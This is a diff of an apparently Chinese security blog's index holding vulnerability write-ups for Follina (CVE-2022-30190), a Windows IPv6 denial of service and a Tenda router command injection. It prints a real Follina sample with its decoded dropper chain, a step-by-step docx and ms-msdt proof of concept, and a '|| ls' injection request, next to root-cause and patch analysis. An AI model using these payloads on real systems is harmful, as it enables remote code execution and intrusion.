-</ul>
-<h4 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h4><p>WTP提供了一系列默认故障排除包，可以在ms-msdt协议里通过-id参数指定。</p>
-<p>CVE-2022-30190使用PCWDiagnostic，用于程序兼容性故障排除。</p>
-<h2 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00 漏洞描述"></a>0x00 漏洞描述</h2><p>Microsoft Office MSDT存在远程代码执行漏洞，攻击者可以利用Office文件中的远程模块功能，访问远程服务器上挂载的恶意HTML文件，之后通过ms-msdt URL来执行恶意powershell代码，漏洞在宏被禁用的情况下依然可以利用。</p>
-<h2 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a>0x01 漏洞分析</h2><p>CVE-2022-30190本质上是PowerShell代码注入漏洞。MSDT和Powershell的C:\Windows\diagnostics\system\PCW\TS_ProgramCompatibilityWizard.ps1脚本交互，相关的IT_BrowseForFile参数存在命令注入，最终的调用PowerShell动态执行。</p>
-<p><strong>影响版本：</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">Microsoft Windows Server 2008 SP2
-Microsoft Windows 11
-Microsoft Windows Server 2019
-Microsoft Windows 10 1607
-Microsoft Windows Server 20H2
-Microsoft Windows Server 2022
-Microsoft Windows Server 2016 (Server Core installation)
-Microsoft Windows Server 2016 null
-Microsoft Windows 10
-Microsoft Windows 10 1809
-Microsoft Windows Server 2008 R2 SP1
-Microsoft Windows Server 2022 (Server Core installation)
-Microsoft Windows Server 2019 (Server Core installation)
-Microsoft Windows 8.1
-Microsoft Windows 10 20H2
-Microsoft Windows 10 21H2
-Microsoft Windows Server 2012 R2
-Microsoft Windows 7 SP1
-Microsoft Windows RT 8.1 SP0
-Microsoft Windows Server 2012
-Microsoft Windows 10 21H1
-Microsoft Windows Server 2022 Azure Edition Core Hotpatch <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+NdisGetDataBuffer 返回指向连续数据的开头的指针，或者返回 NULL。
+如果 NetBuffer 参数指向的 NET_BUFFER 结构中NET_BUFFER_DATA结构的 DataLength 成员小于 BytesNeeded 参数中的值，则返回值为 NULL。
+如果缓冲区中请求的数据是连续的，则返回值是指向 NDIS 提供的位置的指针。 如果数据不连续，NDIS 使用 存储 参数，如下所示：
+如果 Storage 参数为非 NULL，则 NDIS 会将数据复制到 存储中的缓冲区。 返回值是传递给 Storage 参数的指针。
+如果 Storage 参数为 NULL，则返回值为 NULL。
+由于无法映射数据缓冲区的低资源条件，返回值也可能为 NULL 。 即使数据连续或存储参数为非 NULL，也可能发生这种情况。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h4 id="样本分析"><a href="#样本分析" class="headerlink" title="样本分析"></a>样本分析</h4><p>样本是docx文件，解压，其中/word/_rels目录下的document.xml.rels文件包含对<a href="https://www.xmlformats.com/office/word/2022/wordprocessingDrawing/RDF842l.html%E7%9A%84%E5%A4%96%E9%83%A8%E5%BC%95%E7%94%A8%E3%80%82">https://www.xmlformats.com/office/word/2022/wordprocessingDrawing/RDF842l.html的外部引用。</a></p>
-<p><img src="/2023/04/16/CVE-2022-30190%20MSDT%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220816163900629.png"></p>
-<p><strong>RDF842l.html原始内容：</strong></p>
-<p>使用了4个参数，IT_RebrowseForFile、IT_LaunchMethod、IT_SelectProgram、IT_BrowseForFile。利用IT_BrowseForFile参数加载了powershell脚本执行恶意功能。4096字节的A填充，是windows诊断工具的缓冲区大小。</p>
-<pre class="line-numbers language-none"><code class="language-none">&lt;!doctype html&gt;
-&lt;html lang="en"&gt;
-&lt;body&gt;
-&lt;script&gt;
-//AAAAAAAAAAAAAAAAAAAAAAAA
-//重复让整个html文件达到4096字节
-    window.location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=cal?c IT_LaunchMethod=ContextMenu IT_SelectProgram=NotListed IT_BrowseForFile=h$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'JGNtZCA9ICJjOlx3aW5kb3dzXHN5c3RlbTMyXGNtZC5leGUiO1N0YXJ0LVByb2Nlc3MgJGNtZCAtd2luZG93c3R5bGUgaGlkZGVuIC1Bcmd1bWVudExpc3QgIi9jIHRhc2traWxsIC9mIC9pbSBtc2R0LmV4ZSI7U3RhcnQtUHJvY2VzcyAkY21kIC13aW5kb3dzdHlsZSBoaWRkZW4gLUFyZ3VtZW50TGlzdCAiL2MgY2QgQzpcdXNlcnNccHVibGljXCYmZm9yIC9yICV0ZW1wJSAlaSBpbiAoMDUtMjAyMi0wNDM4LnJhcikgZG8gY29weSAlaSAxLnJhciAveSYmZmluZHN0ciBUVk5EUmdBQUFBIDEucmFyPjEudCYmY2VydHV0aWwgLWRlY29kZSAxLnQgMS5jICYmZXhwYW5kIDEuYyAtRjoqIC4mJnJnYi5leGUiOw=='+  [char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe IT_AutoTroubleshoot=ts_AUTO\"";
-&lt;/script&gt;
-&lt;/body&gt;
-&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>首先使用window.location.href创建窗口，ms-msdt是windows诊断工具，之后调用powershell，执行的内容经过了base64加密</p>
-<p><img src="/2023/04/16/CVE-2022-30190%20MSDT%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220817165023922.png"></p>
-<p>解密得到</p>
-<pre class="line-numbers language-none"><code class="language-none">$cmd = "c:\windows\system32\cmd.exe";Start-Process $cmd -windowstyle hidden -ArgumentList "/c taskkill /f /im msdt.exe";Start-Process $cmd -windowstyle hidden -ArgumentList "/c cd C:\users\public\&amp;&amp;for /r %temp% %i in (05-2022-0438.rar) do copy %i 1.rar /y&amp;&amp;findstr TVNDRgAAAA 1.rar&gt;1.t&amp;&amp;certutil -decode 1.t 1.c &amp;&amp;expand 1.c -F:* .&amp;&amp;rgb.exe";<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>启动隐藏窗口：</p>
-<pre class="line-numbers language-none"><code class="language-none">如果msdt.exe正在运行，终止它
-循环遍历RAR文件中的文件，查找编码CAB文件的Base64字符串
-将Base64字符串编码的cab文件保存1.c
-将1.c cab文件展开到当前目录
-最后执行rgb.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>因此window会无限制执行powershell.如果修改成想要执行的代码，就会导致远程代码执行漏洞。因此，只需修改xml文件，引用网站上的恶意代码就行。</p>
-<h4 id="触发条件"><a href="#触发条件" class="headerlink" title="触发条件"></a>触发条件</h4><p>在Microsoft.Windows.Diagnosis.SDHost.dll里的Microsoft.Windows.Diagnosis.ManagedHost.Run Script()方法实现了IScriptedDiagnosticHost com接口里的RunScript方法，用于给msdt.exe提供执行检测脚本所需要的PowerShell运行时环境，然后重新触发漏洞。RunScript()方法一共被触发了两次，第一次用于调用TS脚本，第二次用于调用RS脚本。</p>
-<p>要触发对RS_ProgramCompatibityWizard.ps1的调用，要先通过TS_ProgramCompatibilityWizard.ps1脚本的检测</p>
-<h4 id="TS-ProgramCompatibilityWizard-ps1"><a href="#TS-ProgramCompatibilityWizard-ps1" class="headerlink" title="TS_ProgramCompatibilityWizard.ps1"></a>TS_ProgramCompatibilityWizard.ps1</h4><p>Get-DiagInput用于从用户获取输入的信息，获取传入的IT_BrowseForFile参数，并赋值给$selectedProgram变量。</p>
-<pre class="line-numbers language-none"><code class="language-none">if(-not($ChoicesAvailable))
-{
-    $selectedProgram = Get-DiagInput -id IT_BrowseForFile
-}
-else
-{
-    $selectedProgram = Get-DiagInput -id IT_SelectProgram -choice $choices
-
-	## If the user chose the option "Not listed" we will ask them to browse for a file
-    if($selectedProgram -eq "NotListed")
-    {
-        $selectedProgram = Get-DiagInput -id IT_BrowseForFile
-    }
-}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>调用Test-Selection方法对$selectedProgram进行检测。使用test_path命令来对路径进行检测，确保路径存在，对于/../返回到根路径之外的路径返回True，要求路径的扩展名为exe和msi。</p>
-<pre class="line-numbers language-none"><code class="language-none">function Test-Selection([string]$appPath)
-{
-    $testresult = $false
-
-    if(($appPath -ne $null) -and -not([String]::IsNullOrEmpty($appPath)))
-    {
-        $testresult = test-path -literalpath $appPath
-
-        if($testresult)
-        {
-            if(-not($type::IsFileProtected($appPath)))
-            {
-                $extension = [System.IO.Path]::GetExtension($appPath)
-                $testresult = ($extension -eq ".exe") -or ($extension -eq ".msi")
-            }
-            else
-            {
-                $testresult = $false
-                Set-Variable -name rebrowseText -value $CompatibilityStrings.Text_FILE_PROTECTED -scope global
-            }
-        }
-    }
-
-    Set-Variable -name appValid -value $testResult -scope global
-}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>从$selectedProgram提取文件名，过滤$符号，防止代码注入。由于脚本直接使用$,$实际会在过滤前被PowerShell引擎解析，所以无法起到过滤$字符的作用。</p>
-<p>正确写法应为 $appName = [System.IO.Path]::GetFileNameWithoutExtension($selectedProgram).Replace(“`$”, “``$”)</p>
-<pre class="line-numbers language-none"><code class="language-none">while(-not($appValid))
-{
-    $InstanceId++
-    $selection = $selectedProgram
-    $selectedProgram = Get-DiagInput -id IT_RebrowseForFile -parameter @{ "SelectedProgram" = $selection; "RebrowseText" = $rebrowseText; "Instance" = $InstanceId }
-    Set-Variable -name rebrowseText -value $CompatibilityStrings.Text_FILE_INVALID -scope global
-    Test-Selection($selectedProgram)
-}
-
-$appName = [System.IO.Path]::GetFileNameWithoutExtension($selectedProgram).Replace("$", "`$")<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>TS最后使用Update-DiagRootCause命令，用于报告root cause的状态。会触发RS_脚本，parameter指定的字典会被作为参数传给脚本，导致第二次调用RunScript()方法，并且参数中-TargetPath可控，进而触发了漏洞。</p>
-<pre class="line-numbers language-none"><code class="language-none">if ($UpdateChoice -eq "ts_Manual")
-{
-    $Env:RecommendedLayer = $AppInfo[2]
-    Update-DiagRootCause -id "RC_IncompatibleApplication" -iid $appName -Detected $true -parameter @{ "TARGETPATH" = $selectedProgram; "APPNAME" = $appName}
-}
-else
-{
-    Start-Process -FilePath $AppInfo[1]
-}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><p>1.新建word文档，后缀更改为zip，打开后编辑/word/_regs目录下的document.xml.rels按照格式加入。</p>
-<pre class="line-numbers language-none"><code class="language-none">&lt;Relationship  Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObje ct" Target="mhtml:http://localhost:80/exploit.html!x-usc:http://localhost:80/exploit.html" TargetMode="External"/&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>2.建一个文件夹作为web站点目录，新建exploit.html文件添加（弹计算器）</p>
-<pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;
-location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=?
-IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(\\\\localhost\\c$\\windows\\system32\\calc)/.exe\"";
-&lt;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>IT_RebrowseForFile参数开头至少需要两次/../目录遍历</p>
-<p>包含$()中的代码会通过PowerShell执行</p>
-<p>.exe必须是IT_BrowseForFile参数末尾的最后一个字符串</p>
-<h2 id="0x03-漏洞修复"><a href="#0x03-漏洞修复" class="headerlink" title="0x03 漏洞修复"></a>0x03 漏洞修复</h2><p><strong>缓解方法：</strong></p>
-<p>1.禁用MSDT URL协议阻止使用漏洞的恶意攻击。</p>
-<p>2.禁用MSDT URL协议可防止故障排除应用程序作为链接启动，包括整个操作系统的链接。</p>
-<p><strong>禁用方法：</strong></p>
-<p>1.以管理员身份运行命令提示符</p>
-<p>2.备份注册表项，执行命令<code>reg export HKEY_CLASSES_ROOT\ms-msdt [filename]</code></p>
-<p>3.执行命令<code>reg delete HKEY_CLASSES_ROOT\ms-msdt</code></p>
-<p><strong>撤销禁用：</strong></p>
-<p>1.以管理员身份运行命令提示符</p>
-<p>2.恢复注册表项，执行命令“reg import [filename]”</p>
+<p>NdisGetDataBuffer函数返回数据指针或者NULL，rax是NdisGetDataBuffer函数的返回值，当赋值为0，之后赋值数据没有判断是否是空指针，就会导致异常。</p>
+<h3 id="ndis-NdisGetDataBuffer"><a href="#ndis-NdisGetDataBuffer" class="headerlink" title="ndis!NdisGetDataBuffer"></a>ndis!NdisGetDataBuffer</h3><p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221108152123775.png"></p>
+<p>NetBuffer-&gt;DataLength小于传进来的第二个参数BytesNeeded就会返回0。</p>
+<h3 id="tcpip-NetioRetreatNetBuffer"><a href="#tcpip-NetioRetreatNetBuffer" class="headerlink" title="tcpip!NetioRetreatNetBuffer"></a>tcpip!NetioRetreatNetBuffer</h3><p>在调用ndis!NdisGetDataBuffer之前调用了tcpip!NetioRetreatNetBuffer函数</p>
+<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221109102806617.png"></p>
+<p>函数调用之前，NET_BUFFER-&gt;CurrentMdlOffset还没有设置，会调用NdisRetreatNetBufferDataStart函数设置NET_BUFFER结构。</p>
+<p>NdisRetreatNetBufferDataStart会把NET_BUFFER-&gt;DataLength设置为0x10,函数返回0</p>
+<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221109105241377.png"></p>
+<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221109105650123.png"></p>
+<p>a2 BytesNeeded是v3+0x28，v3是a2偏移0x68，a2是Ipv6pReceiveFragment函数中由IppCreateInReassemblySet生成，满足条件后才会调用tcpip!Ipv6pReassembleDatagram进行重组。</p>
+<h3 id="Ipv6pReceiveFragment"><a href="#Ipv6pReceiveFragment" class="headerlink" title="Ipv6pReceiveFragment"></a>Ipv6pReceiveFragment</h3><p>Ipv6pReceiveFragment函数作用是处理分片，当最后一个分片校验通过，就会调用tcpip!Ipv6pReassembleDatagram函数进行重组。</p>
+<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221109110612827.png"></p>
+<h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><p>攻击机：kali2022<br>靶机：win10专业版1709（16299.125）</p>
+<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221107164353456.png"></p>
+<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221107164441542.png"></p>
+<p>NdisGetDataBuffer有返回NULL的情况，可以使NET_BUFFER为NULL，NdisGetDataBuffer会返回NULL，就会触发BSOD空指针引用。</p>
+<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221109113544500.png"></p>
+<h3 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h3><p>Ipv6pReassembleDatagram增加了判断，当重组数据包options_data_length和fragment_sum_length和大于0xFFFF会调用IppDeleteFromReassmblySet函数删除这个包的信息，跳过重组。</p>
+<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221109140212506.png"></p>
+<p>在NetioRetreaNetBuffer函数调用处将第二个参数长度变成32位，避免后续调用NdisGetDataBuffer参数不一致。</p>
+<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221109140232843.png"></p>
 ]]></content>
       <categories>
         <category>CVE</category>
@@ -2547,6 +2371,182 @@ sudo dhclient br0<span aria-hidden="true" class="line-numbers-rows"><span></span
 <pre class="line-numbers language-none"><code class="language-none">192.168.130.137/goform/WriteFacMac?mac=00:01:02:11:22:33 || ls<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121175540394.png"></p>
+]]></content>
+      <categories>
+        <category>CVE</category>
+      </categories>
+      <tags>
+        <tag>CVE</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CVE-2022-30190 MSDT远程代码注入漏洞分析</title>
+    <url>/2023/04/16/CVE-2022-30190%20MSDT%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<h2 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h2><h4 id="WTP框架"><a href="#WTP框架" class="headerlink" title="WTP框架"></a>WTP框架</h4><p>windows疑难解答平台（WTP）为ISV、OEM和管理员提供了疑难解答包的过程，这些包用于发现和解决计算机上的问题。WTP框架提供自动化检测修复方式。</p>
+<h4 id="底层结构"><a href="#底层结构" class="headerlink" title="底层结构"></a>底层结构</h4><img src="/2023/04/16/CVE-2022-30190%20MSDT%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220816150216855.png" alt="image-20220816150216855" style="zoom: 67%;">
+
+<ul>
+<li>WTP由两个进程组成，Process1是带UI的Troubleshooting Run-time Engine，Process2用于提供window PowerShell Runtime环境。</li>
+<li>Process2提供的PowerShell运行时环境提供了4条特殊的PowerShell命令：Get-DiagInput、Update-DiagReport、Update-DiagRootCause、Write-DiagProgress</li>
+<li>Troubleshooting Pack运行在Process1和Process2所构建的平台上。</li>
+</ul>
+<h4 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h4><ul>
+<li><p>故障排除包是用户可编程部分，本质上是一组针对特定故障的检测修复脚本。Process1(Troubleshooting Run-time Engine)通过故障排除包获取检测脚本检测问题，查出问题交给Process2(PowerShell)运行处理。</p>
+</li>
+<li><p>Process1是msdt.exe，Process2是sdiagnhost.exe</p>
+</li>
+<li><p>sdiagnhost.exe为了给msdt.exe提供运行脚本的能力，注册了IScriptedDiagnosticHost com接口，相应的com方法是RunScript()</p>
+</li>
+<li><p>故障排除包的设计基于三个步骤：检测问题（troubleshooting）、解决问题（resolution）和验证解决方案（verificationg），对应TS、RS、VF三种脚本。</p>
+</li>
+</ul>
+<h4 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h4><p>WTP提供了一系列默认故障排除包，可以在ms-msdt协议里通过-id参数指定。</p>
+<p>CVE-2022-30190使用PCWDiagnostic，用于程序兼容性故障排除。</p>
+<h2 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00 漏洞描述"></a>0x00 漏洞描述</h2><p>Microsoft Office MSDT存在远程代码执行漏洞，攻击者可以利用Office文件中的远程模块功能，访问远程服务器上挂载的恶意HTML文件，之后通过ms-msdt URL来执行恶意powershell代码，漏洞在宏被禁用的情况下依然可以利用。</p>
+<h2 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a>0x01 漏洞分析</h2><p>CVE-2022-30190本质上是PowerShell代码注入漏洞。MSDT和Powershell的C:\Windows\diagnostics\system\PCW\TS_ProgramCompatibilityWizard.ps1脚本交互，相关的IT_BrowseForFile参数存在命令注入，最终的调用PowerShell动态执行。</p>
+<p><strong>影响版本：</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">Microsoft Windows Server 2008 SP2
+Microsoft Windows 11
+Microsoft Windows Server 2019
+Microsoft Windows 10 1607
+Microsoft Windows Server 20H2
+Microsoft Windows Server 2022
+Microsoft Windows Server 2016 (Server Core installation)
+Microsoft Windows Server 2016 null
+Microsoft Windows 10
+Microsoft Windows 10 1809
+Microsoft Windows Server 2008 R2 SP1
+Microsoft Windows Server 2022 (Server Core installation)
+Microsoft Windows Server 2019 (Server Core installation)
+Microsoft Windows 8.1
+Microsoft Windows 10 20H2
+Microsoft Windows 10 21H2
+Microsoft Windows Server 2012 R2
+Microsoft Windows 7 SP1
+Microsoft Windows RT 8.1 SP0
+Microsoft Windows Server 2012
+Microsoft Windows 10 21H1
+Microsoft Windows Server 2022 Azure Edition Core Hotpatch <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="样本分析"><a href="#样本分析" class="headerlink" title="样本分析"></a>样本分析</h4><p>样本是docx文件，解压，其中/word/_rels目录下的document.xml.rels文件包含对<a href="https://www.xmlformats.com/office/word/2022/wordprocessingDrawing/RDF842l.html%E7%9A%84%E5%A4%96%E9%83%A8%E5%BC%95%E7%94%A8%E3%80%82">https://www.xmlformats.com/office/word/2022/wordprocessingDrawing/RDF842l.html的外部引用。</a></p>
+<p><img src="/2023/04/16/CVE-2022-30190%20MSDT%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220816163900629.png"></p>
+<p><strong>RDF842l.html原始内容：</strong></p>
+<p>使用了4个参数，IT_RebrowseForFile、IT_LaunchMethod、IT_SelectProgram、IT_BrowseForFile。利用IT_BrowseForFile参数加载了powershell脚本执行恶意功能。4096字节的A填充，是windows诊断工具的缓冲区大小。</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;!doctype html&gt;
+&lt;html lang="en"&gt;
+&lt;body&gt;
+&lt;script&gt;
+//AAAAAAAAAAAAAAAAAAAAAAAA
+//重复让整个html文件达到4096字节
+    window.location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=cal?c IT_LaunchMethod=ContextMenu IT_SelectProgram=NotListed IT_BrowseForFile=h$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'JGNtZCA9ICJjOlx3aW5kb3dzXHN5c3RlbTMyXGNtZC5leGUiO1N0YXJ0LVByb2Nlc3MgJGNtZCAtd2luZG93c3R5bGUgaGlkZGVuIC1Bcmd1bWVudExpc3QgIi9jIHRhc2traWxsIC9mIC9pbSBtc2R0LmV4ZSI7U3RhcnQtUHJvY2VzcyAkY21kIC13aW5kb3dzdHlsZSBoaWRkZW4gLUFyZ3VtZW50TGlzdCAiL2MgY2QgQzpcdXNlcnNccHVibGljXCYmZm9yIC9yICV0ZW1wJSAlaSBpbiAoMDUtMjAyMi0wNDM4LnJhcikgZG8gY29weSAlaSAxLnJhciAveSYmZmluZHN0ciBUVk5EUmdBQUFBIDEucmFyPjEudCYmY2VydHV0aWwgLWRlY29kZSAxLnQgMS5jICYmZXhwYW5kIDEuYyAtRjoqIC4mJnJnYi5leGUiOw=='+  [char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe IT_AutoTroubleshoot=ts_AUTO\"";
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>首先使用window.location.href创建窗口，ms-msdt是windows诊断工具，之后调用powershell，执行的内容经过了base64加密</p>
+<p><img src="/2023/04/16/CVE-2022-30190%20MSDT%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220817165023922.png"></p>
+<p>解密得到</p>
+<pre class="line-numbers language-none"><code class="language-none">$cmd = "c:\windows\system32\cmd.exe";Start-Process $cmd -windowstyle hidden -ArgumentList "/c taskkill /f /im msdt.exe";Start-Process $cmd -windowstyle hidden -ArgumentList "/c cd C:\users\public\&amp;&amp;for /r %temp% %i in (05-2022-0438.rar) do copy %i 1.rar /y&amp;&amp;findstr TVNDRgAAAA 1.rar&gt;1.t&amp;&amp;certutil -decode 1.t 1.c &amp;&amp;expand 1.c -F:* .&amp;&amp;rgb.exe";<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>启动隐藏窗口：</p>
+<pre class="line-numbers language-none"><code class="language-none">如果msdt.exe正在运行，终止它
+循环遍历RAR文件中的文件，查找编码CAB文件的Base64字符串
+将Base64字符串编码的cab文件保存1.c
+将1.c cab文件展开到当前目录
+最后执行rgb.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>因此window会无限制执行powershell.如果修改成想要执行的代码，就会导致远程代码执行漏洞。因此，只需修改xml文件，引用网站上的恶意代码就行。</p>
+<h4 id="触发条件"><a href="#触发条件" class="headerlink" title="触发条件"></a>触发条件</h4><p>在Microsoft.Windows.Diagnosis.SDHost.dll里的Microsoft.Windows.Diagnosis.ManagedHost.Run Script()方法实现了IScriptedDiagnosticHost com接口里的RunScript方法，用于给msdt.exe提供执行检测脚本所需要的PowerShell运行时环境，然后重新触发漏洞。RunScript()方法一共被触发了两次，第一次用于调用TS脚本，第二次用于调用RS脚本。</p>
+<p>要触发对RS_ProgramCompatibityWizard.ps1的调用，要先通过TS_ProgramCompatibilityWizard.ps1脚本的检测</p>
+<h4 id="TS-ProgramCompatibilityWizard-ps1"><a href="#TS-ProgramCompatibilityWizard-ps1" class="headerlink" title="TS_ProgramCompatibilityWizard.ps1"></a>TS_ProgramCompatibilityWizard.ps1</h4><p>Get-DiagInput用于从用户获取输入的信息，获取传入的IT_BrowseForFile参数，并赋值给$selectedProgram变量。</p>
+<pre class="line-numbers language-none"><code class="language-none">if(-not($ChoicesAvailable))
+{
+    $selectedProgram = Get-DiagInput -id IT_BrowseForFile
+}
+else
+{
+    $selectedProgram = Get-DiagInput -id IT_SelectProgram -choice $choices
+
+	## If the user chose the option "Not listed" we will ask them to browse for a file
+    if($selectedProgram -eq "NotListed")
+    {
+        $selectedProgram = Get-DiagInput -id IT_BrowseForFile
+    }
+}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>调用Test-Selection方法对$selectedProgram进行检测。使用test_path命令来对路径进行检测，确保路径存在，对于/../返回到根路径之外的路径返回True，要求路径的扩展名为exe和msi。</p>
+<pre class="line-numbers language-none"><code class="language-none">function Test-Selection([string]$appPath)
+{
+    $testresult = $false
+
+    if(($appPath -ne $null) -and -not([String]::IsNullOrEmpty($appPath)))
+    {
+        $testresult = test-path -literalpath $appPath
+
+        if($testresult)
+        {
+            if(-not($type::IsFileProtected($appPath)))
+            {
+                $extension = [System.IO.Path]::GetExtension($appPath)
+                $testresult = ($extension -eq ".exe") -or ($extension -eq ".msi")
+            }
+            else
+            {
+                $testresult = $false
